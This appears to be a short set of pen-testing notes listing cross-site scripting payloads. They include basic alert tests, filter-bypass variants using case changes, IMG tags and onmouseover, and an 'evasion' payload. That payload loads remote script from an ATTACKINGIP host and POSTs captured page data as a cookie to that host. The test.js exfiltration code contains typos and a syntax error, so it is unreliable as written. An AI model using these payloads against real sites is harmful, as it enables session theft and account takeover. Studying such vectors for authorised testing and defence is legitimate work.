# Examples

This is a good list:

[https://www.linkedin.com/pulse/20140812222156-79939846-xss-vectors-you-may-need-as-a-pen-tester](https://www.linkedin.com/pulse/20140812222156-79939846-xss-vectors-you-may-need-as-a-pen-tester)

## No security

`<script>alert(1)</script>`

Imagine that the server sanitizes `<script>`. To bypass that we can use:  
`<SCrIpt>alert(2)</ScRiPt>`  
`<script type=text/javascript>alert(2)</script>`

### Using the IMG-tag

```
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG onmouseover="alert('xxs')">
```

### Onmouseover

```
<a onmouseover="alert(2)">d</a>
```

### Evasion Attempts

```
<Img src="x/><script>eval(String.fromCharCode(document.write('<script src="http://ATTACKINGIP/test.js"></script>');))</script>">


test.js
var req1 = new XMLHttpRequest();
req1.open('GET','http://localhost:8000/vasrsasd',false);
req1.send();
var response = req1.responseText;
var req2 = new XMLHttpRequest();
var params = "cookie=" + encdoeURIComponenet(response);
req2.open('POST', 'http://ATTACKINGIP:8000/pwn', true;
req2.setRequestHeader('Content-Type', 'application/x-ww-form-urlencoded');
req2.send(params);


should create url encodeded data file, can grab cookie from
```



